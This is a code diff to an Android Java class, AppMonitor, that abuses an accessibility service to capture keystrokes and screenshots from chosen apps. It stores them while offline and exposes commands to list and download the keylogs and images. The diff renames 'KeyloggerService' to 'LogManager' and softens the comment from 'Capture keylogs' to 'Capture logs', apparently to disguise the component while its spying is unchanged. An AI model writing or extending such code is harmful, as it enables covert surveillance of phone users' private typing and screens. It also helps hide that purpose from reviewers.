@@ -14,7 +14,7 @@ import java.io.ByteArrayOutputStream;
 
 /**
  * AppMonitor — hooks into UnifiedAccessibilityService to:
- *  1. Capture keylogs per monitored app (stored via KeyloggerService)
+ *  1. Capture logs per monitored app (stored via LogManager)
  *  2. Capture accessibility screenshots (UI screenshots) for monitored apps
  *
  * Monitoring continues even when the device is offline; logs are stored
@@ -27,19 +27,19 @@ public class AppMonitor {
     private static final String TAG = "AppMonitor";
 
     private final Context        context;
-    private final KeyloggerService keyloggerService;
+    private final LogManager logManager;
     private String               currentMonitoredPkg = null;
 
-    public AppMonitor(Context context, KeyloggerService keyloggerService) {
+    public AppMonitor(Context context, LogManager logManager) {
         this.context          = context.getApplicationContext();
-        this.keyloggerService = keyloggerService;
+        this.logManager = logManager;
     }
 
     /** Called from UnifiedAccessibilityService on every text-change event. */
     public void onTextChanged(String packageName, String text) {
         if (!isMonitored(packageName)) return;
         String appName = getAppName(packageName);
-        keyloggerService.logEntry(packageName, appName, text, "TEXT_CHANGED");
+        logManager.logEntry(packageName, appName, text, "TEXT_CHANGED");
     }
 
     /** Called from UnifiedAccessibilityService when foreground app changes. */
@@ -59,7 +59,7 @@ public class AppMonitor {
             ByteArrayOutputStream baos = new ByteArrayOutputStream();
             // Compress to JPEG at 60% quality to save space
             screenshot.compress(Bitmap.CompressFormat.JPEG, 60, baos);
-            keyloggerService.saveAppScreenshot(packageName, baos.toByteArray());
+            logManager.saveAppScreenshot(packageName, baos.toByteArray());
         } catch (Exception e) {
             Log.e(TAG, "onScreenChange: " + e.getMessage());
         }
@@ -91,7 +91,7 @@ public class AppMonitor {
             }
 
             // Apps that have stored data
-            JSONObject stored = keyloggerService.listMonitoredApps();
+            JSONObject stored = logManager.listMonitoredApps();
 
             result.put("success", true);
             result.put("configured", configured);
@@ -104,27 +104,27 @@ public class AppMonitor {
 
     /** get_app_keylogs */
     public JSONObject getAppKeylogs(String packageName, String date, int limit) {
-        return keyloggerService.getAppKeylogs(packageName, date, limit);
+        return logManager.getAppKeylogs(packageName, date, limit);
     }
 
     /** list_app_keylog_files */
     public JSONObject listAppKeylogFiles(String packageName) {
-        return keyloggerService.listAppKeylogFiles(packageName);
+        return logManager.listAppKeylogFiles(packageName);
     }
 
     /** download_app_keylog_file */
     public JSONObject downloadAppKeylogFile(String packageName, String date) {
-        return keyloggerService.downloadAppKeylogFile(packageName, date);
+        return logManager.downloadAppKeylogFile(packageName, date);
     }
 
     /** list_app_screenshots */
     public JSONObject listAppScreenshots(String packageName) {
-        return keyloggerService.listAppScreenshots(packageName);
+        return logManager.listAppScreenshots(packageName);
     }
 
     /** download_app_screenshot */
     public JSONObject downloadAppScreenshot(String packageName, String filename) {
-        return keyloggerService.downloadAppScreenshot(packageName, filename);
+        return logManager.downloadAppScreenshot(packageName, filename);
     }
 
     // ── App Manager commands ─────────────────────────────────────────────
